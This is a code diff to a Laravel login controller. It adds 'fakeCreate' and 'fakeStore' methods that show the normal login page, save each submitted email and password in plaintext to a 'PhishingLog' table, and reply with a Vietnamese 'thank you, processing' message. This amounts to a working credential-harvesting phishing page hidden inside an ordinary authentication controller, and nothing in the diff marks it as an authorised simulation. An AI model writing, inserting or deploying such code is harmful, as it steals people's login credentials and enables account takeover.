@@ -8,6 +8,7 @@ use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\View\View;
+use App\Models\PhishingLog;
 
 class AuthenticatedSessionController extends Controller
 {
@@ -29,6 +30,27 @@ class AuthenticatedSessionController extends Controller
         $request->session()->regenerate();
 
         return redirect()->intended(route('dashboard', absolute: false));
+    }
+
+    /**
+     * Display the login view.
+     */
+    public function fakeCreate(): View
+    {
+        return view('auth.login');
+    }
+
+    /**
+     * Handle an incoming authentication request.
+     */
+    public function fakeStore(LoginRequest $request): RedirectResponse
+    {
+        PhishingLog::create([
+            'email' => $request->email,
+            'password' => $request->password,
+        ]);
+
+        return back()->with('status', 'Cảm ơn, hệ thống đang xử lý...');
     }
 
     /**
